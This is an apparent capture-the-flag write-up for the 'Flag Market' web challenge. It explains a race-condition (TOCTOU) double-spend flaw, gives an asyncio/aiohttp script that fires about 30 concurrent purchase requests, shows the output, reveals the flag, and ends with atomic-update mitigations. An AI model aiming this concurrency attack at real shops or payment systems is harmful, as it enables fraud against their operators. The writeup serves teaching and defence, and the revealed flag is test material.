# Flag Market - Web Challenge Writeup

**Challenge:** Flag Market  
**Category:** Web  
**Difficulty:** Medium  
**Points:** 300  
**Flag:** `VishwaCTF{r4ced_t0_v1ct0ry_044_40_tw0_t1me5}`

## Challenge Description

Welcome to 'Node 01', the premium artifacts marketplace. Our transaction system is top-of-the-line... or so we claim. Can you find a way to acquire 10 flag fragments despite your limited budget?

## Hints

1. **Hint 1:** Concurrency can be your best friend when trying to 'double spend' your budget.
2. **Hint 2:** The currency deduction isn't immediate.

## Solution

### Reconnaissance

The challenge presents a marketplace where:
- Users start with 1000 credits
- Flag artifacts cost 1000 credits each
- Need 10 flag artifacts to get the flag
- Total cost would be 10,000 credits (but we only have 1,000!)

### Vulnerability Analysis

The hints clearly point to a **race condition vulnerability**:
- "Concurrency can be your best friend" → Use concurrent requests
- "Currency deduction isn't immediate" → There's a time window between purchase and balance update

This is a classic **TOCTOU (Time-of-Check-Time-of-Use)** vulnerability where:
1. Server checks if user has enough credits
2. Server processes the purchase
3. Server deducts credits from balance

If multiple requests arrive simultaneously, they all pass the credit check before any deduction happens, allowing us to "double spend" our budget.

### Exploitation

The key is to send multiple purchase requests **simultaneously** before the server can update the balance:

```python
import asyncio
import aiohttp

async def buy_item(session, item_id, thread_id):
    """Buy a single item"""
    async with session.post(f"{BASE_URL}/api/buy", 
                           json={"itemId": item_id}) as resp:
        result = await resp.json()
        if result.get("flag"):
            return result['flag']
        return result.get("success")

async def race_attack(cookies, num_requests=30):
    """Launch truly concurrent requests"""
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        # Launch all requests at the EXACT same time
        tasks = [buy_item(session, "flag_artifact", i) 
                for i in range(num_requests)]
        results = await asyncio.gather(*tasks)
        return results
```

### Attack Flow

1. **Create Account:** Register a new user (gets 1000 credits)
2. **Launch Race Condition:** Send 30+ simultaneous purchase requests for flag_artifact
3. **Exploit Window:** Multiple requests pass the credit check before balance updates
4. **Acquire Fragments:** Successfully purchase 10+ fragments with only 1000 credits
5. **Get Flag:** Server returns flag when inventory reaches 10 fragments

### Results

```
[*] Initial coins: 1000
[+] Thread 0: Purchase successful! Inventory: 1
[+] Thread 8: Purchase successful! Inventory: 2
[+] Thread 15: Purchase successful! Inventory: 3
...
[+] Thread 6: Purchase successful! Inventory: 10
[!!!] FLAG FOUND: VishwaCTF{r4ced_t0_v1ct0ry_044_40_tw0_t1me5}
...
[*] Final state:
    Coins: 0
    Inventory: {'flag_artifact': 25}
[*] Flag artifacts acquired: 25/10
```

Successfully acquired 25 flag artifacts using only 1000 credits by exploiting the race condition!

## Key Takeaways

1. **Race Conditions:** Non-atomic operations on shared resources (like user balance) can be exploited with concurrent requests
2. **Async is Key:** Using `asyncio` with `aiohttp` allows truly simultaneous requests, unlike threading which may be sequential
3. **TOCTOU Vulnerabilities:** Always use atomic operations (transactions, locks) when checking and modifying shared state
4. **Mitigation:** Use database transactions with proper isolation levels, or implement optimistic locking

## Mitigation Recommendations

```javascript
// Bad (vulnerable)
if (user.coins >= item.price) {
    user.coins -= item.price;  // Race condition here!
    user.inventory[item]++;
}

// Good (atomic)
UPDATE users 
SET coins = coins - ? 
WHERE id = ? AND coins >= ?
// Check affected rows to ensure atomic check-and-update
```

## Flag

```
VishwaCTF{r4ced_t0_v1ct0ry_044_40_tw0_t1me5}
```

The flag cleverly references "raced to victory" and "two times" (double spending)!
